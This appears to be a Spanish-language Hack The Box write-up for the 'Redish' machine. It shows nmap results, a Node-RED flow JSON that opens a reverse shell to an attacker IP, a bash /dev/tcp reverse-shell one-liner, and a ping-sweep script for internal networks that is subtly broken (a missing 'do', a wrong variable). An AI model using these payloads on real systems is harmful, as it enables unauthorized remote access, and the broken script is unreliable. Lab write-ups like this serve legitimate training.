# Redish

## NMAP

![image](https://github.com/gecr07/RedishHTB/assets/63270579/325411cf-e1b7-49a2-b667-067b49606bb8)

![image](https://github.com/gecr07/RedishHTB/assets/63270579/911975ed-cde7-47ac-8df7-904c60b548c9)

Ahora (no hubiera sabido como la verdad) visitamos el link.

> http://10.10.10.94:1880/red/e72c52ec2ba93670b5b9fcc018afcdff

![image](https://github.com/gecr07/RedishHTB/assets/63270579/e38e48cf-9265-49b5-a93c-1bd6a15f2ffb)

Para la shell reversa se usa:

```
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.14.126","port":"9999","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]

```

Una vez dentro pues nos damos cuenta que la shell esta muy precaria ( y asi lo hacen todos los writes que he visto nos mandamos otro shell


```
[object Object]bash -c "bash -i >& /dev/tcp/10.10.14.28/1234 0>&1"
```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/484e0234-1c4e-4ba5-b818-23bd4fb61d5a)

Descubrimiento de puertos.

```
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

trap ctrl_c INT


networks=(172.18.0 172.19.0)


tput civis; for network in ${networks[@]}
    for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 $networks.$i" &>/dev/null && echo -e "\t[+] Host $network.$i -ACTIVE" &
    done; wait 

done; tput cnorm
```










































































































